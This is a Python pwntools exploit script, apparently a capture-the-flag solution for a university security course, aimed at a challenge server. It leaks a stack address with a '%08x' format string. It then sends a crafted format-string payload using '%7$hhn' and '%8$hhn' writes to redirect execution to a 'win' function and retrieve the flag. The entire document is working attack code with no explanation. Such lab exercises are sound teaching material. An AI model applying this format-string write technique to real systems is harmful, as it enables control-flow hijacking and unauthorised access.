from pwn import remote, p32

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23198

session = remote(SERVER, PORT, timeout=10000)

session.sendline(b'%08x')
buffer_address = int(session.recvline().decode(), 16)
print(hex(buffer_address))
session.close()

win_address = 0x80491f6

session = remote(SERVER, PORT, timeout=10000)

target_address = buffer_address + 144
buffer = p32(target_address + 1) + p32(target_address) 
sec_least_sig_byte = (win_address >> 8) & 0xff
padding = (sec_least_sig_byte - 8) % 256
buffer += str.encode("%{}x".format(padding)) + b"%7$hhn"
least_sig_byte = win_address & 0xff
padding = (least_sig_byte - sec_least_sig_byte) % 256
buffer += str.encode("%{}x".format(padding) ) + b"%8$hhn"

print(buffer)

session.sendline(buffer)
flag = session.recvline_contains(b"SSof")
session.close()
print(flag.decode())